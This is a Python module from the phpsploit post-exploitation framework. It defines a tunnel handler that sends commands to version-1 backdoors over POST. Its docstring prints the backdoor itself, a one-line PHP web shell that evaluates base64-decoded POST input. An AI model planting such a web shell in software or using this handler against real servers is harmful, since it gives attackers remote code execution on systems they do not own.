"""Backwards compatible tunnel handler for
phpsploit v1 backdoors, aka:
    <?php eval(base64_decode($_POST[%%PASSKEY%%])); ?>
"""
__all__ = ["Request_V1_x"]

from . import handler
from .exceptions import BuildError


class Request_V1_x(handler.Request):

    def __init__(self):
        """Force default method to POST, because only this one
        was supported on phpsploit v1 versions.
        """
        super().__init__()
        self.default_method = "POST"

    def build_forwarder(self, method, decoder):
        """Assuming that phpsploit v1 uses POST data as payload container
        without using an intermediate forwarder, this method shall
        always return an empty dictionnary.
        """
        return {}

    def load_multipart(self):
        raise BuildError("Can't send multi request in v1-compatible mode")
